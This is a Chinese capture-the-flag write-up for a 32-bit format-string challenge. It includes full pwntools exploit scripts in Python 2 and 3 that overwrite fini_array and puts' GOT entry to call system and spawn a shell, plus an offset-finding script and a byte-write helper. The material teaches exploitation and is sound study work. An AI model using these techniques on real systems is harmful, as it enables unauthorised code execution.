# fmt1

### 保护

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

几乎没有开..

### 漏洞

字符串漏洞

源代码

main

```c++
  char format[4]; // [esp+0h] [ebp-198h]
  int v5; // [esp+4h] [ebp-194h]
  char v6; // [esp+8h] [ebp-190h]
  int *v7; // [esp+190h] [ebp-8h]

  v7 = &argc;
  init();
  strcpy(format, "hello: ");
  memset(&v6, 0, 0x188u);
  printf("Welcome to D0g3-19-simple-fmt\nwhat's your name?");
  fgets((char *)&v5 + 3, 100, stdin);//不存在栈溢出
  if ( times_3273 ) //必须time_3273不为0才能执行
    exploit_me(format); //这里可以调用system
  printf(format);                               // 存在字符串漏洞
  ++times_3273;
```

exploit_me函数中

```c
  puts(s);
  return system("echo your name is ku");
```

有一个system.

### 利用

由于程序中只有一个字符串漏洞, 执行字符串漏洞后结束,这时就需要覆盖fini_array为start函数进行再次执行程序同时修改puts的got表为system plt地址.

简单介绍一下: fini_array, 在`main`函数前会调用`.init`段代码和`.init_arra`y段的函数数组中每一个函数指针。同样的，`main`函数结束后也会调用`.fin`i段代码和`.fini._arrary`段的函数数组中的每一个函数指针.

### 跑偏移

这是我写的跑偏移脚本,很垃圾,大部分都是手动去数一下, 总比手敲或者调试好些...

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "./pwn1"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
maxLen = 0x30
minLen = 0x10
preSendStr = '?'
recvStr = ': '

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

def calc(payload):
	if(preSendStr == ''):
		sl(payload)
	else:
		sla(preSendStr, payload)

	if(recvStr != ''):
		ru(recvStr)

	recv = ra()
	infos = recv.split(',')
	offset = -1
	for info in infos:
		li(info)
		offset += 1
		if('0x44434241' == info):
			return offset	
	#pause()
	return -1

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	length = 0;
	payload = 'ABCD' + ',%p' * minLen
	while(True):
		if LOCAL:
			io = process(exeFile)	
		else:
			io = remote(remoteIp, remotePort)
		offset = calc(payload) 
		if(-1 != offset):
			li('---------------------------------------------')
			li('\noffset:' + str(offset))	
			io.close()
			break
		io.close()
		payload += ',%p'	
		length += 1

		if(length > maxLen):
			li('---------------------------------------------')
			li('not found! maxLen too litile')
			io.close
			break

```



得到偏移为: 6, 但是在利用字符串漏洞的时候,还有得内存对齐一下.

### 字符串漏洞设置大的值注意的地方

```
hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数
h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数
```

1. 第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.
2. 之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为`%30c% offset$hhn`
3. 当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 =  0xD0（208），也就是填入%208c%offset$hhn即可

单字节覆盖常用脚本(ctf-wiki):

```python
def fmt(prev, word, index): # prev: payload 长度,  word: 单个字符, index: 偏移地址 + i
    if prev < word: #若payload长度小于单个字符的值时
        result = word - prev
        fmtstr = "%" + str(result) + "c" #直接写入差值,补齐
    elif prev == word: #若payload长度等于单个字符的值时
        result = 0 #不写
    else:       #若payload长度大于单个字符的值时
        result = 256 + word - prev  #通过单个字符溢出来打
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn" #添加自payload
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i) #32位将要覆盖的地址
        else:
            payload += p64(addr + i) #64位将要覆盖的地址
    prev = len(payload) #获取payload长度
    for i in range(4):
        #传入,payload长度, 目标字节, 偏移
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

#fmt_str(12, 4, exe.got['strlen'], exe.plt['system'])
'''
其中每个参数的含义基本如下
    offset表示要覆盖的地址最初的偏移
    size表示机器字长
    addr表示将要覆盖的地址。
    target表示我们要覆盖为的目的变量值。
'''
```

通过上面的介绍, 根据以上脚本写字符串漏洞原理写exp

### exp- python2.7

```python

 #!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn1"
libFile  = ""

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru('?')
	puts_got = exe.got['puts']

	system_plt = exe.plt['system']
	fini_array = 0x08049F0C

	start_addr = 0x08048450
#	system_plt = 0x08048410
	li('puts got: ' + hex(puts_got))
	li('system plt: ' + hex(system_plt))

	offset = 6
	prelen = len('hello: ') #printf在打印的字符个数也要算进payload

	p = 'A' #内存对齐
	p += p32(puts_got + 2) #puts_got 地址的高两位
	p += p32(fini_array + 2) #fini_array 地址的高两位
	p += p32(puts_got) #puts_got 地址的低两位
	p += p32(fini_array) #fini_array 地址的低两位
    #覆盖puts_got的高两位为 system_got的高两位
	p += '%' + str(0x0804 - 0x11 - prelen) + 'c%' + str(offset) + '$hn'
    #覆盖fini_array的高两位为 start地址的高两位
	p += '%' + str(offset + 1) + '$hn'
    #覆盖puts_got的低两位为 system_got的低两位
	p += '%' + str(0x8410 - 0x0804) + 'c%' + str(offset + 2) + '$hn'
    #覆盖fini_array的低两位为 start地址的低两位
	p += '%' + str(0x8450 - 0x8410) + 'c%' + str(offset + 3) + '$hn'

	#db()
	sl(p)
	ru('?')
	sl(';sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		io = exe.process()
		if LIBC:
			libc = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()   

```

### exp- python3.8

```python
#!/usr/bin/env python3
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn1"
libFile  = ""

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	ru('?')
	puts_got = exe.got['puts']

	system_plt = exe.plt['system']
	fini_array = 0x08049F0C

	start_addr = 0x08048450
#	system_plt = 0x08048410
	li('puts got: ' + hex(puts_got))
	li('system plt: ' + hex(system_plt))

	offset = 6
	prelen = len('hello: ')

	print(type(p32(0x1)))
	p = b'A'
	# high word
	p += p32(puts_got + 2)
	p += p32(fini_array + 2)
	# low word
	p += p32(puts_got)
	p += p32(fini_array)
	p += bytes(('%' + str(0x0804 - 0x11 - prelen) + 'c%' + str(offset) + '$hn'), encoding = 'utf8')
	p += bytes(('%' + str(offset + 1) + '$hn'), encoding = 'utf8')
	# modify lowword(strlen_got)
	p += bytes(('%' + str(0x8410 - 0x0804) + 'c%' + str(offset + 2) + '$hn'), encoding = 'utf8')
	p += bytes(('%' + str(0x8450 - 0x8410) + 'c%' + str(offset + 3) + '$hn'), encoding = 'utf8')

	#db()
	sl(p)
	ru('?')
	sl(';sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		io = exe.process()
		if LIBC:
			libc = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
```



